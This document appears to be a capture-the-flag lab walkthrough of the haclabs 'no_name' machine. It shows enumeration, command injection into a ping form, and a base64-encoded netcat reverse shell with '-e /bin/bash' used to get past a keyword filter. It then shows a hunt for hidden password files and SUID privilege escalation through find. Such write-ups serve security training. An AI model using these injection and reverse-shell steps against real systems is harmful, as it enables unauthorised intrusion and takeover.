# Exercise 1: haclabs: no_name

Kali and target VM are on 192.168.50.0 network

First, nmap host discovery

![Text Description automatically generated](media/51f8e032e04a2df92f0f83ebede1fb88.png)

Target is in 192.168.50.16. Only one open port: http port  
Get detailed info with nmap -A -p80 192.168.50.16  
Meanwhile, visit website

![A screenshot of a computer Description automatically generated](media/ceeaf7a4f2ed312f24406a15834d4870.png)

![Graphical user interface, text Description automatically generated](media/4ad3b37970e9a1f89b99ba7e80f4eeb1.png)

Post method on the button, perhaps we can explore more

Before we mess around with the form, run feroxbuster in the background to enumerate hidden directories. Use big.txt wordlist since we have a lot of time

feroxbuster --url http://192.168.50.16/ -w /usr/share/wordlists/dirb/big.txt -t 100 -C 403,404 -x php,txt

After trying out various commands (id, ; id, “; id, help), the output is always “Fake ping executed”

Meanwhile, feroxbuster finished running

![](media/bd00ccb3cf28a049afa5f665604f0e56.png)

seems like there is a superadmin.php webpage, similar looking post form

![Graphical user interface, text Description automatically generated](media/3867d62f36e02efe74c991b5e85fdcbc.png)

Entered “localhost” onto form, gives a result

![A screenshot of a computer Description automatically generated](media/208d913b2890f6e2e0a82ed935088aa9.png)

If the input is not sanitised, we can try various ways to execute other commands

After trying ;id, “id, “;id, I did some research to find other interesting php operators. Stumbled upon pipe operator: <https://wiki.php.net/rfc/pipe-operator-v2>. Evaluates anything on the left and passes it onto the right as an argument and executes command on the right. Therefore I entered “localhost \| id” which gives me this

![](media/32bfdb9f026e044eac811784101b96e4.png)

Tried the same thing with ls but nothing shows up, perhaps there is some form of input sanitising. Tried running echo, also didn’t work. Ran “find .” as if to list all files in the current directory, like ls. It gives a result

![](media/3bf288de365729834800704807cbcf31.png)

superadmin.php exists, so print file content using cat. “localhost \| cat superadmin.php”.

Similar website structure except there are two login forms. View source ![](media/2f4331670529c1546427a276d542167d.png)

Filters out phrases containing words in “word” array, including nc which is needed for a reverse shell

Convert netcat command to base64 which will then be decoded and run to bypass word filtering. Listen on port 4444

![](media/595b857fe0f9341c707c8b5fefd86466.png) ![Text Description automatically generated](media/53ca627d2ba8db66247b50aa546b0789.png)

![Graphical user interface, text, application Description automatically generated](media/12c3065079558949028c3e0a65b43f9b.png)

Command: localhost \| echo "bmMgMTkyLjE2OC41MC41IDQ0NDQ=" \| base64 -d

![Graphical user interface, text, application Description automatically generated](media/3dc10186df66999309efaf99bbe19724.png)

Shell is not spawned. Instead, it prints the decoded value without executing it

Quick google search reveals a php backtick operator which executes anything within it

<https://www.php.net/manual/en/language.operators.execution.php>  
New command is localhost \| \`echo "bmMgMTkyLjE2OC41MC41IDQ0NDQ=" \| base64 -d\`

![](media/8a1be08f8d2f6382b523f31e58e78aa9.png)

remove localhost since it is executing the command in our shell instead

New command: \| \`echo "bmMgMTkyLjE2OC41MC41IDQ0NDQ=" \| base64 -d\`

However, no shell access

![Text Description automatically generated](media/086803c6c8ce784a3b1c96585fe0a2d2.png)

Seems like we forgot to add -e /bin/bash flag which only works on nc.traditional.

![Graphical user interface, text, application, email Description automatically generated](media/cfcb5e8dfa0e05da664eb987ccff20a7.png)

We redo the above command with the new base64 string

\| \`echo "bmMudHJhZGl0aW9uYWwgMTkyLjE2OC41MC41IDQ0NDQgLWUgL2Jpbi9iYXNo=" \| base64 -d\`

![](media/d137c8f77bcd2844856ba887428a74ec.png)

We have shell!

haclabs password in a hidden file. Try looking for files containing “pass”. It gives too many results  
find / -name “\*pass\*” 2\> /dev/null

![](media/6ab5f3b3843bc203bad7fa7ccd995abf.png)

Since it’s a hidden file, we try to search all hidden files that are readable by the user yash  
find / -user yash -name “.\*” 2\> /dev/null

![Text Description automatically generated](media/19e38089f7132a23a853e9b0995afe4b.png)

login to haclabs First, upgrade to interactive shell using python’s pty command.  
python -c 'import pty; pty.spawn("/bin/bash")'

Didn’t work. Try python3 and python2

![Text Description automatically generated](media/4acf7e33f9891686737085087c8b5db2.png)

Now login to haclabs and get flag 2

![Text Description automatically generated](media/cef312f60f8e1e4f6f01c8ed877a6dae.png)

Now we try to find any binaries with SUID bit set to root upon execution

find / -uid 0 -perm -4000 -type f 2\> /dev/null

![](media/4cdc342e5c4d45709c8f9050bd6b4917.png)

Search gtfobin for each binary  
[https://gtfobins.github.io/gtfobins/pkexec/\#sudo](https://gtfobins.github.io/gtfobins/pkexec/#sudo) (did not work)  
[https://gtfobins.github.io/gtfobins/find/\#sudo](https://gtfobins.github.io/gtfobins/find/#sudo) (worked)

![Text Description automatically generated](media/09148e36d6eb82f3169655b1aed18953.png)
